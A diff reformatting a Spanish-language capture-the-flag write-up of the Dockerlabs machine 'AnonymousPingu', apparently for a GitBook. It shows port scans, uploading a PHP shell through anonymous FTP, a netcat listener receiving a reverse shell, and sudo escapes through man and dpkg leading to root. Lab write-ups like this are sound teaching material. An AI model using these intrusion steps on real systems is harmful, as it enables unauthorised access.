@@ -1,22 +1,30 @@
-# 🖥️ Writeup - AnonymousPingu 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# AnonymousPingu ​​
+
+## 🖥️ Writeup - AnonymousPingu
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `FTP` `FileUpload` `Pivoting` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip anonymouspingu.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh anonymouspingu.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p21,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 18:10 CEST
 Nmap scan report for 172.17.0.2
@@ -106,7 +115,7 @@ En particular, nos llama la atención el directorio `/upload`, sobre el cual ten
 
 Comprobamos si este directorio existe también en el puerto `80`.
 
-![alt text](../../images/upload3.png)
+![alt text](../../.gitbook/assets/upload3.png)
 
 Efectivamente existe, aunque inicialmente no contiene ningún archivo.
 
@@ -119,6 +128,7 @@ put shell.php
 ```
 
 Info:
+
 ```
 ftp> put shell.php 
 local: shell.php remote: shell.php
@@ -138,6 +148,7 @@ nc -nlvp 4444
 A continuación, accedemos vía `HTTP` al directorio `/upload` para ejecutar el archivo.
 
 Info:
+
 ```
 connect to [10.0.4.12] from (UNKNOWN) [172.17.0.2] 55016
 Linux 5f4ca3874341 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64 x86_64 x86_64 GNU/Linux
@@ -152,36 +163,42 @@ $
 
 Con ello obtenemos una `reverse shell` como el usuario `www-data`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Comprobamos permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for www-data on 5f4ca3874341:
     env_reset, mail_badpass,
@@ -200,14 +217,14 @@ sudo -u pingu man man
 
 Cuando tengamos abierta la interfaz de `man`, ejecutamos el comando `!/bin/bash` y pivotamos con éxito a dicho usuario.
 
-
 Una vez como usuario pingu volvemos a comprobar permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for pingu on 5f4ca3874341:
     env_reset, mail_badpass,
@@ -223,17 +240,18 @@ Comprobamos que podemos ejecutar el binario `dpkg` con privilegios del usuario `
 
 ```bash
 sudo -u gladys dpkg -l
-``` 
+```
 
 De forma similar, lo aprovechamos ejecutando `!/bin/bash` desde la interfaz de `dpkg`, consiguiendo pivotar de nuevo con éxito.
 
 Una vez como usuario gladys volvemos a comprobar permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for gladys on 5f4ca3874341:
     env_reset, mail_badpass,
@@ -273,6 +291,7 @@ su root
 ```
 
 Info:
+
 ```
 root@5f4ca3874341:/home/gladys# whoami
 root
